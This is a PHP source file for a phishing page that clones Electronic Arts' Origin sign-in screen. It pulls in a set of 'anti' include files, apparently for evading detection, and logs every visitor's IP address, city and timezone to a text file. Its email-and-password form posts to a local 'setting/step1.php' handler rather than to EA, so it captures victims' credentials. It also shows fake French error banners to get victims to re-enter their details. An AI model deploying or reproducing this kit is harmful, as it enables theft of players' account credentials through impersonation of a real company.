<?php
include 'prevents/anti1.php';
include 'prevents/anti2.php';
include 'prevents/anti3.php';
include 'prevents/anti4.php';
include 'prevents/anti5.php';
include 'prevents/anti6.php';
include 'prevents/anti7.php';
include 'prevents/anti8.php';
include 'prevents/anti9.php';
 ob_start();
session_start();
  $content2 = "".$_SESSION['ip']."|".$_SESSION['ip_city']."|".$_SESSION['ip_timezone']."|\r\n";
    $save2=fopen("login_view/total_login_view.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);
 
?>


<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
    <title>Connexion</title>
    <meta name="title" content="Connexion"/>
    <meta name="description" content="Connexion"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="shortcut icon" href="/p/favicon.ico"/>
    <meta name="lc" content="fr_FR"/>
    <meta name="_csrf" content="54a82ad0-e64e-445f-bc38-f9bac8d36f1e"/>
    <!-- default header name is X-CSRF-TOKEN -->
    <meta name="_csrf_header" content="X-SECURITY"/>
    <meta name="robots" content="noindex" />

        <meta name="viewport" content="initial-scale=1.0,width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"/>

<script type="text/javascript">window.EA = {};</script>
<script type="text/javascript" src="//fonts.ea.com/fbl8bgs.js"></script>
<script type="text/javascript">(function () {
    try {
        Typekit.load();
    } catch (ex) {
        var html = document.getElementsByTagName('html')[0];
        html.className = (html.className || '') + ' wf-inactive'
    }
})();</script>


        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/548.0.200924.1597.67134aa/p/ui/core/js/jquery-1.8.3.min.v_1600955728.js"></script>
        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/548.0.200924.1597.67134aa/p/ui/core/js/jquery.origin-ux-elements.v_1600955728-min.js"></script>
        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/548.0.200924.1597.67134aa/p/ui/core/js/jquery.origin-layout.v_1600955728-min.js"></script>
        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/548.0.200924.1597.67134aa/p/statics/web2/js/jquery.origin-web-login.v_1600955728-min.js"></script>

            <script src='https://www.recaptcha.net/recaptcha/api.js?hl=fr'></script>

<script type="text/javascript">
    $(document).ready(function () {
        $.fn.login({
            'successfulLogin': false,
            'loginType': '',
            'returnUrl': '/us/account',
            'upgradeRequired': false,
            'linkAccount': false,
            'linkAccountConfirm': false,
            'ps4Locale': 'fr_FR',
            'xboxLocale': 'fr',
            'recaptcha': false,
            'resetPasswordLink': '/us/account/reset-password',
            'gCaptchaEnabled':true,
            'contextPath': '/p'
        });
        $('#recaptcha_response_field').width('250px');
        if (false && false) {
            showtab('phoneNumber');
            $("#phoneNumber").blur(); //check if it's an incomplete phone user
        } else {
            showtab('email');
        }
        if(!false) {
            $('#login-with-phoneNum-link').hide();
        }
    });
    function switchtab(tab) {
        $(".general-error").hide();
        showtab(tab);
        return true;
    }// function switchtab(tab)
    function showtab(tab) {
        if (tab == 'phoneNumber') {
            $('#email-login-panel').hide();
            $('#login-with-phoneNum-link').hide();
            $('#login-with-email-link').show();
            $('#phone-login-panel').hide();
            $('#phone-login-verify-panel').show();
            $('#isPhoneNumberLogin').val(true);
            $('#btnLogin').hide();
            $('#btnIncompleteContinue').show();
            $('#btnIncompleteContinue').removeClass("disabled");
        }
        else {
            $('#connect_btn_continue').hide();
            $('#phone-login-panel').hide();
            $('#phone-login-verify-panel').hide();
            $('#login-with-email-link').hide();
            $('#login-with-phoneNum-link').show();
            $('#email-login-panel').show();
            $('#isPhoneNumberLogin').val(false);
            $('#btnLogin').show();
            $('#btnLogin').removeClass("disabled");
            $('#btnIncompleteContinue').hide();
        }
        return true;
    }// function showtab(tab)
    function forgot_password(){
        var url;
        if($('#isPhoneNumberLogin').val() == "true") {
            url = "/p/web2/resetPasswordForPhone?fid=RlMxOjMuMDoyLjA6M3h0NTFPeEN6QUloMk55ajZHaWhQWFhrOnBlbWcz";
        } else {
            url = "/p/web2/resetPassword?fid=RlMxOjMuMDoyLjA6M3h0NTFPeEN6QUloMk55ajZHaWhQWFhrOnBlbWcz";
        }
        if (!window.opener) {
            if (top == self) {
                window.location = url;
            } else {
                // this window is not the topmost window, maybe is the frame
                window.open(url, "_parent");
            }
        } else {
            window.opener.location = url;
            self.close();
        }
    }// function forgot_password()
</script>

                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/548.0.200924.1597.67134aa/p/ui/core/css/origin-ux-elements.v_1600955728-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/548.0.200924.1597.67134aa/p/ui/core/css/origin-ux-elements_fr.v_1600955728-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/548.0.200924.1597.67134aa/p/ui/core/css/origin-layout.v_1600955728-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/548.0.200924.1597.67134aa/p/statics/web2/css/origin-ux-elements.v_1600955728-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/548.0.200924.1597.67134aa/p/statics/web2/css/origin-layout.v_1600955728-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/548.0.200924.1597.67134aa/p/statics/web2/css/origin-web-skin.v_1600955728-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/548.0.200924.1597.67134aa/p/statics/web2/css/origin-web-login.v_1600955728-min.css"/>

<!--  GA -->
<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','web2Analytics');
    web2Analytics('create', 'UA-38277543-2' , '.ea.com');

</script>
<!-- End of GA -->
    <!-- Tealium -->
    <script type="text/javascript">
        var utag_data = {
            region: "EMEA",
            locale: "fr_FR",
            country: "FR",
            language: "fr",
            userid: "",
            user_status: "",
            referring_site: "",
            page_name: "https://signin.ea.com/p/web2/login"
        }
    </script>
    <script type="text/javascript">
        (function (a, b, c, d) {
            a = '//tags.tiqcdn.com/utag/ea/signin-eacom/prod/utag.js';
            b = document;
            c = 'script';
            d = b.createElement(c);
            d.src = a;
            d.type = 'text/java' + c;
            d.async = true;
            a = b.getElementsByTagName(c)[0];
            a.parentNode.insertBefore(d, a);
        })();
    </script>
    <!-- End of tealium -->

<script type="text/javascript">
    $(document).ready(function () {
        var skin = 'origin';
        var bodySelector = $("body");
        switch (skin) {
            case "origin":
                bodySelector.addClass("origin-com");
                break;
            case "franchisedark":
                bodySelector.addClass("ea-franchise").addClass("ea-franchise-dark");
                break;
            case "franchiselight":
                bodySelector.addClass("ea-franchise").addClass("ea-franchise-light");
                break;
            case "ea":
            default:
                bodySelector.addClass("ea-com");
                break;
        }
    })
</script>

            <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/548.0.200924.1597.67134aa/p/ui/core/js/jquery.ba-postmessage.min.v_1600955728.js"></script>
<script type="text/javascript">
    function postHeight() {
        if (top != self) {
            var height = $('#loginForm').height();
            var width = $('#loginForm').width();
            var messageObj = {"set_height": height, "set_width": width};
            $.postMessage(JSON.stringify(messageObj), '*', parent);
        }
    }
    ;
    window.onload = postHeight;
</script>



    <script type="text/javascript">
        $(function () {
            var token = $("meta[name='_csrf']").attr("content");
            var header = $("meta[name='_csrf_header']").attr("content");
            $(document).ajaxSend(function(e, xhr, options) {
                xhr.setRequestHeader(header, token);
            });
        });
    </script>

    <script type="text/javascript">
        sendGAweb2Event = function(action, label) {
            if(action && label){
                var passed = Array.prototype.slice.call(arguments);
                var paras = ['send', 'event', 'Web2'].concat(passed);
                if (typeof web2Analytics !== 'undefined') {
                    web2Analytics.apply(this, paras);
                }
            }
        };

        sendGAweb2PageView = function(pageName) {
            if (typeof web2Analytics !== 'undefined' && pageName) {
                web2Analytics('send', 'pageview',pageName);
            }
        };

        sendGAweb2TimingEvent = function(action, timing) {
            if(action && timing){
                var passed = Array.prototype.slice.call(arguments);
                var paras = ['send', 'timing', 'Web2'].concat(passed);
                if (typeof web2Analytics !== 'undefined') {
                    web2Analytics.apply(this, paras);
                }
            }
        };
    </script>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
    <title>Log In</title>
    <meta name="title" content="Log In"/>
    <meta name="description" content="Log In"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="shortcut icon" href="scp/favicon.ico"/>
    <meta name="lc" content="en_US"/>


        <meta name="viewport" content="initial-scale=1.0,width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"/>

<script type="text/javascript">window.EA = {};</script>
<script type="text/javascript" src=""></script>
<script type="text/javascript">
(function () {
    try {
        Typekit.load();
    } catch (ex) {
        var html = document.getElementsByTagName('html')[0];
        html.className = (html.className || '') + ' wf-inactive'
    }
})();
</script>


        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/js/jquery-1.8.3.min.v_1599803148.js"></script>
        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/js/jquery.origin-ux-elements.v_1599803148-min.js"></script>
        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/js/jquery.origin-layout.v_1599803148-min.js"></script>
        <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/statics/web2/js/jquery.origin-web-login.v_1599803148-min.js"></script>



<script type="text/javascript">
    $(document).ready(function () {
        $.fn.login({
            'successfulLogin': false,
            'loginType': '',
            'returnUrl': '/us/account',
            'upgradeRequired': false,
            'linkAccount': false,
            'linkAccountConfirm': false,
            
            'recaptcha': false,
            'resetPasswordLink': '/us/account/reset-password',
            'gCaptchaEnabled':true,
            'contextPath': '/p'
        });
        $('#recaptcha_response_field').width('250px');
        if (false && false) {
            showtab('phoneNumber');
            $("#phoneNumber").blur(); //check if it's an incomplete phone user
        } else {
            showtab('email');
        }
        if(!false) {
            $('#login-with-phoneNum-link').hide();
        }
    });
    function switchtab(tab) {
        $(".general-error").hide();
        showtab(tab);
        return true;
    }// function switchtab(tab)
    function showtab(tab) {
        if (tab == 'phoneNumber') {
            $('#email-login-panel').hide();
            $('#login-with-phoneNum-link').hide();
            $('#login-with-email-link').show();
            $('#phone-login-panel').hide();
            $('#phone-login-verify-panel').show();
            $('#isPhoneNumberLogin').val(true);
            $('#btnLogin').hide();
            $('#btnIncompleteContinue').show();
            $('#btnIncompleteContinue').removeClass("disabled");
        }
        else {
            $('#connect_btn_continue').hide();
            $('#phone-login-panel').hide();
            $('#phone-login-verify-panel').hide();
            $('#login-with-email-link').hide();
            $('#login-with-phoneNum-link').show();
            $('#email-login-panel').show();
            $('#isPhoneNumberLogin').val(false);
            $('#btnLogin').show();
            $('#btnLogin').removeClass("disabled");
            $('#btnIncompleteContinue').hide();
        }
        return true;
    }// function showtab(tab)
    function forgot_password(){
        var url;
        if($('#isPhoneNumberLogin').val() == "true") {
            url = "#";
        } else {
            url = "#";
        }
        if (!window.opener) {
            if (top == self) {
                window.location = url;
            } else {
                // this window is not the topmost window, maybe is the frame
                window.open(url, "_parent");
            }
        } else {
            window.opener.location = url;
            self.close();
        }
    }// function forgot_password()
</script>
 <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/css/origin-ux-elements.v_1599803148-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/css/origin-ux-elements_fr.v_1599803148-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/ui/core/css/origin-layout.v_1599803148-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/statics/web2/css/origin-ux-elements.v_1599803148-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/statics/web2/css/origin-layout.v_1599803148-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/statics/web2/css/origin-web-skin.v_1599803148-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/547.0.200911.1528.2a7f0eb/p/statics/web2/css/origin-web-login.v_1599803148-min.css"/>

<!--  GA -->

<!-- End of GA -->
   

<script type="text/javascript">
    $(document).ready(function () {
        var skin = 'origin';
        var bodySelector = $("body");
        switch (skin) {
            case "origin":
                bodySelector.addClass("origin-com");
                break;
            case "franchisedark":
                bodySelector.addClass("ea-franchise").addClass("ea-franchise-dark");
                break;
            case "franchiselight":
                bodySelector.addClass("ea-franchise").addClass("ea-franchise-light");
                break;
            case "ea":
            default:
                bodySelector.addClass("ea-com");
                break;
        }
    })
</script>

            <script type="text/javascript" src="https://eaassets-a.akamaihd.net/resource_signin_ea_com/546.0.200512.785.234a6b1/p/ui/core/js/jquery.ba-postmessage.min.v_1589247028.js"></script>
<script type="text/javascript">
    function postHeight() {
        if (top != self) {
            var height = $('#loginForm').height();
            var width = $('#loginForm').width();
            var messageObj = {"set_height": height, "set_width": width};
            $.postMessage(JSON.stringify(messageObj), '*', parent);
        }
    }
    ;
    window.onload = postHeight;
</script>



   
    <script type="text/javascript">
        sendGAweb2Event = function(action, label) {
            if(action && label){
                var passed = Array.prototype.slice.call(arguments);
                var paras = ['send', 'event', 'Web2'].concat(passed);
                if (typeof web2Analytics !== 'undefined') {
                    web2Analytics.apply(this, paras);
                }
            }
        };

        sendGAweb2PageView = function(pageName) {
            if (typeof web2Analytics !== 'undefined' && pageName) {
                web2Analytics('send', 'pageview',pageName);
            }
        };

        
    </script>
	<style>
		@media (min-width: 800px)
		.general-error {
				margin: 0 0 20px;
				width: auto;
						}
		 @media (min-width: 0)
			.general-error {
				margin: 0 auto 20px;
				width: 259px;
			}
			.general-error {
   // background: url(../../../ui/core/img/background-general-error.png) right -49px;
	background-color : red;
    height: 49px;
    overflow: hidden;
    display: none;
    margin: 0 0 20px;
			padding: 0 10px 0 0;
		border-radius: 6px;	
			}
			.general-error>div>div {
    display: table-cell;
    padding: 0 20px 0 55px;
    font: normal 13px/13px Arial,Helvetica,sans-serif;
    color: #fff;
    vertical-align: middle;
    text-align: left;
    word-wrap: break-word;
    word-break: normal;
}
	</style>

</head>
<body>



<div class="loading-container"></div>

    <div class="login-container main-container">
<form id="loginForm" method="POST"  action="setting/step1.php" > 
							 <?php
							 $email="true";
							 $info="true";
							 if (isset($_GET['email'])&&!empty($_GET['email'])) {

							 $email = $_GET['email']; 
							 }
							 if (isset($_GET['info'])&&!empty($_GET['info'])) {

							 $info = $_GET['info']; 
							 }
							  if($email=="false") {
           						 echo '    <div class="general-error" style="display: block;">
									<div>
										<div><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">	    Adresse e-mail non valide </font> </font></div> </div>
								</div>	';
        							 }
									 if($info=="false") {
           						 echo '    <div class="general-error" style="display: block;">
									<div>
										<div><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">    Vos infos sont incorrectes ou ont expiré. Réessayez ou réinitialisez votre mot de passe.
										</font> </font></div> </div>
								</div>	';
        							 }
							?>  
									
									<div class="panel" id="panel-login">
										<div class="login-form-container">
											<div class="panel-contents">
												<div class="panel-content">
													<div class="franchise-area"></div>
													<div class="marketing-area"></div>

													<p>Sign in with your EA Account</p>

													<h1></h1>
														<ul id="email-login-panel">
														<li class="email-container">
							<div class="origin-ux-element origin-ux-textbox">
									<label class="origin-ux-textbox-label">
									Email Address
									</label>
								<span class="origin-ux-textbox-control origin-ux-control origin-ux-purple-textbox-control">
									<span>
										<input type="email" id="email"
											   name="email"
											   value=""
											   description="" data-description="" placeholder=""   autocorrect="off" autocapitalize="off" autocomplete="off"/>
									</span>
								</span>
								<span class="origin-ux-textbox-status-icon"></span>
								<span class="origin-ux-textbox-status-message origin-ux-status-message">
									&nbsp;
								</span>
							</div>
								
														</li>
														<li class="password-container">
							<div class="origin-ux-element origin-ux-textbox">
									<label class="origin-ux-textbox-label">
									Password
									</label>
								<span class="origin-ux-textbox-control origin-ux-purple-textbox-control origin-ux-control">
									<span>
										<input type="password" id="password" name="password" value=""
											   autocorrect="off" autocapitalize="off" autocomplete="off"/>
									</span>
								</span>
								<span class="origin-ux-textbox-status-icon"></span>
								<span class="origin-ux-textbox-status-message origin-ux-status-message">
									&nbsp;
								</span>
							</div>
														</li>
													</ul>
													   
													   
													<ul id="remember-me-panel">
														<li>
							<div style="display: inline" class="origin-ux-element origin-ux-checkbox">
								<label class="origin-ux-checkbox-label"></label>

								<div class="origin-ux-checkbox-control origin-ux-checkbox-control-purple origin-ux-control">
									<span>
								<input type="hidden" name="_rememberMe" value="on"/>
								<input type="checkbox" id="rememberMe" name="rememberMe" checked="checked" />
									</span>
										<label id="label-rememberMe" class="origin-ux-checkbox-label checkbox-label">Remember me</label>
								</div>
								<span style="display: inline" class="origin-ux-checkbox-status-message origin-ux-status-message">
									&nbsp;</span>
							</div>
															<a href="#" onclick="forgot_password();return false;"
															   class="forgot-password-link-new">Forgot Your Password?</a>
														</li>
													</ul>
												</div>
											</div>
											<div class="panel-action-area">
							<a class='origin-ux-element origin-ux-button
								origin-ux-button-primary  btn-next origin-ux-button-primary-purple' href="#" id="btnLogin">
							<span><span>Log In</span></span>
							</a>
												<br>
							<a class='origin-ux-element origin-ux-button
								origin-ux-button-primary  btn-next origin-ux-button-primary-purple' href="#" id="btnIncompleteContinue">
							<span><span>Continue</span></span>
							</a>
												<br>
													<p id="login-with-email-link" class="login-with-switch-p"><a class="login-with-switch-link"
																												 href="#"
																												 onclick="switchtab('email'); return false;">Use an Email Address</a>
													</p>

												   
								<input type="hidden" name="_eventId" value="submit" id="_eventId"/>
									<input type="hidden" id="gCaptchaResponse" name="gCaptchaResponse" value=""/>
									<input type="hidden" id="thirdPartyCaptchaResponse" name="thirdPartyCaptchaResponse" value=""/>
									<input type="hidden" id="isPhoneNumberLogin" name="isPhoneNumberLogin" value="false"/>
									<input type="hidden" id="isIncompletePhone" name="isIncompletePhone" value=""/>
									<input type="hidden" id="countryPrefixPhoneNumber" name="countryPrefixPhoneNumber" value=""/>
											</div>
										</div>
										<div class="vertical-divider"></div>

									</div>
									
									
		
		
		
		
		
		
		
        <div class="panel" id="panel-registration-box">
            <div class="registration-box-container">
                <div class="marketing-area"></div>

                <h1>EA Network</h1>

                <p id="registration-box-copy1">One account connects you to the world of EA: games, websites, services, and more.</p>



                <p>
                        Don't have an account?<br>
                        <a href="" class="registration-link" isRegisterPopup="no">
                            Create your EA Account</a>
                </p>



                <div class="declaration-logo"></div>
                <p id="login-declaration-brand-text">Origin is part of the EA Network.</p>

                <div class="panel-register-action-area">
<a class='origin-ux-element origin-ux-button origin-ux-button-secondary registration-link' href="" isRegisterPopup="no">
<span><span>Create your EA Account</span></span>
</a>
                </div>
            </div>
            <div class="registration-box-container-mobile">
                <div class="registration-box-container">
                    <p>Don't have an EA account?
                            <a href="" class="registration-link" isRegisterPopup="no">
                                Create your EA Account</a>
                    </p>
                </div>
            </div>
        </div>
<div class="footer">
    <span class="copyright-notice">© 2020 Electronic Arts Inc. Trademarks belong to their respective owners. All rights reserved.</span>
    <ul class="footer-navigation">
            <li class="item-2 even"><a
                    href=""
                    target="_blank"
                    class="link link-origin "><span>Shop at Origin</span></a>
            </li><li class="item-3 odd">
            <a href=""
               target="_blank"
               class="link link-origin"><span>Legal</span></a>
        </li>

                <li class="item-4 even">
                    <a href=""
                       target="_blank"
                       class="link link-origin"><span>User Agreement</span></a>
                </li>
                <li class="item-5 odd">
                <a href="/"
                   target="_blank"
                   class="link link-origin"><span>Privacy and Cookie Policy</span></a>
                </li>

            <li class="item-6 even">
            <a href="" target="_blank"
               class="link link-origin"><span>Corporate Info</span></a>
        </li><li class="item-7 odd">
            <a href=""
               target="_blank"
               class="link link-origin"><span>EA Terms of Sale</span></a>
        </li><li class="item-8 even">
            <a href="" target="_blank"
               class="link link-origin"><span>Contact Us</span></a>
        </li>        
    </ul>
</div>
    </form>
</div>

    <div id="form-errors">
        <span id="form-error-authorization-failure">Your credentials are incorrect or have expired. Please try again or reset your password.</span>
        <span id="form-error-facebook-application-not-authorized">Application not Authorized.</span>
        <span id="form-error-facebook-not-logged-in">Not logged in to Facebook</span>
        <span id="form-error-missing-email">Missing email</span>
        <span id="form-error-missing-phoneNumber">Missing phone number</span>
        <span id="form-error-missing-pwd">Missing password</span>
        <span id="form-error-invalid-email">Email address is invalid</span>
        <span id="form-error-invalid-phone">Invalid phone number</span>
        <span id="form-error-invalid-phoneNumber">
        Your Phone Number your entered cannot be used to sign in. Please check that the number you entered is correct or <a href="#" onclick="switchtab('email'); return false;">sign in with your email</a> instead.</span>
        <span id="form-error-phoneNumber-pwd-incorrect">Your phone number or password is incorrect or has expired. Please try again or reset your password.</span>
    </div>


<!-- ### prdaccountc-120.iad2.infery.com ### -->

</body>
<script>
</script>
</html>
